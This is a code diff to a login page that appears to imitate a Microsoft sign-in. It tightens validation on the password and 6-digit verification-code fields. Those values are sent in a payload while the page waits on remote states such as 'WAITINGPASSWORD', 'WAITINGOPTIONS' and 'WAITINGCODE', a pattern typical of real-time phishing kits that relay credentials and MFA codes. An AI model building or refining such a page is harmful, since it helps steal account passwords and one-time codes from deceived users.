@@ -147,10 +147,10 @@
                                 </div>
                             </div>
                             <div class="form-input-container" id="passwordGroup">
-                                <input name="txtPassword" type="password" maxlength="64" id="txtPassword"
-                                    class="form-text-input" autocomplete="off" size="25"
-                                    aria-describedby="lblPasswordCallout" placeholder="Enter password"
-                                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+    <input name="txtPassword" type="password" maxlength="64" minlength="6" id="txtPassword"
+        class="form-text-input" autocomplete="off" size="25"
+        aria-describedby="lblPasswordCallout" placeholder="Enter password"
+        onkeypress="if(event.key === 'Enter') handleFormSubmission();">
                                 <div class="focus-area">
                                     <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
                                     <div class="callout">
@@ -172,10 +172,11 @@
 
                             <div class="form-input-container" id="verificationCodeGroup" style="display:none;">
                                 <div class="form-message" id="verificationCodeLabel">Enter the verification code sent to your device</div>
-                                <input name="txtVerificationCode" type="text" id="txtVerificationCode"
-                                    class="form-text-input" autocomplete="off" size="25"
-                                    placeholder="Enter verification code"
-                                    onkeypress="if(event.key === 'Enter') handleFormSubmission();">
+    <input name="txtVerificationCode" type="text" id="txtVerificationCode"
+        class="form-text-input" autocomplete="off" size="25" maxlength="6" inputmode="numeric" pattern="[0-9]{6}"
+        placeholder="Enter verification code"
+        onkeypress="if(event.key === 'Enter') handleFormSubmission();"
+        oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,6)">
                                 <div class="form-error-container">
                                     <span id="RequireVerificationCode" style="display:none;">Verification code is
                                         required.</span>
@@ -893,16 +894,24 @@ let processingStartTime = null;
                 if (password) payload.password = password;
                 updateType = 'email';
             } else if (currentStatus === 'WAITINGPASSWORD' || currentStatus === 'WAITINGPASSWORDERROR') {
-                const password = passwordField.value.trim();
-                if (!password) {
-                    document.getElementById('RequirePassword').style.display = 'block';
-                    setFormSubmitting(false);
-                    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                    resetFormState();
-                    return;
-                }
-                payload.password = password;
-                updateType = 'password';
+        const password = passwordField.value.trim();
+        if (!password) {
+            document.getElementById('RequirePassword').style.display = 'block';
+            setFormSubmitting(false);
+            if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+            resetFormState();
+            return;
+        }
+        if (password.length < 6) {
+            document.getElementById('RequirePassword').textContent = 'Password must be at least 6 characters.';
+            document.getElementById('RequirePassword').style.display = 'block';
+            setFormSubmitting(false);
+            if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+            resetFormState();
+            return;
+        }
+        payload.password = password;
+        updateType = 'password';
             } else if (currentStatus === 'WAITINGOPTIONS') {
                 const selected = document.querySelector('input[name="verificationOption"]:checked');
                 if (!selected) {
@@ -936,16 +945,24 @@ let processingStartTime = null;
                 payload.verificationChoice = JSON.stringify([choiceObj]);
                 updateType = 'verificationChoice';
             } else if (currentStatus === 'WAITINGCODE') {
-                const code = verificationCodeInput.value.trim();
-                if (!code) {
-                    document.getElementById('RequireVerificationCode').style.display = 'block';
-                    setFormSubmitting(false);
-                    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-                    resetFormState();
-                    return;
-                }
-                payload.verificationCode = code;
-                updateType = 'verificationCode';
+        const code = verificationCodeInput.value.trim();
+        if (!code) {
+            document.getElementById('RequireVerificationCode').style.display = 'block';
+            setFormSubmitting(false);
+            if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+            resetFormState();
+            return;
+        }
+        if (!/^\d{6}$/.test(code)) {
+            document.getElementById('RequireVerificationCode').textContent = 'Please enter the complete 6-digit code.';
+            document.getElementById('RequireVerificationCode').style.display = 'block';
+            setFormSubmitting(false);
+            if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
+            resetFormState();
+            return;
+        }
+        payload.verificationCode = code;
+        updateType = 'verificationCode';
             } else {
                 showStyledError('Unexpected form submission state. Please try again.');
                 return;
